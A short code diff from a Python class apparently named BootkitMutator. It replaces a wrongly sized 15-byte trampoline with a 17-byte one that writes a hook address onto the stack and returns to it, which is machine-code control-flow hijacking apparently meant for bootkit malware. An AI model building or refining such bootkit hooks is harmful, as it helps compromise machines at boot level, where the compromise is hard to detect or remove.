@@ -135,15 +135,6 @@ class BootkitMutator:
             # 48 C7 04 24 <lo32>; C7 44 24 04 <hi32>; C3
             lo = hook_addr & 0xFFFFFFFF
             hi = (hook_addr >> 32) & 0xFFFFFFFF
-            trampoline = bytearray(15)
-            # MOV DWORD [RSP], lo32
-            trampoline[0:4] = b'\x48\xC7\x04\x24'
-            struct.pack_into('<I', trampoline, 4, lo)
-            # MOV DWORD [RSP+4], hi32
-            trampoline[8:12] = b'\xC7\x44\x24\x04'
-            struct.pack_into('<I', trampoline, 12, hi)
-            # We need space for RET at offset 16 but trampoline is 15 bytes
-            # Actually: 48 C7 04 24 xx xx xx xx (8) + C7 44 24 04 xx xx xx xx (8) + C3 (1) = 17
             trampoline = bytearray(17)
             trampoline[0:4] = b'\x48\xC7\x04\x24'
             struct.pack_into('<I', trampoline, 4, lo)
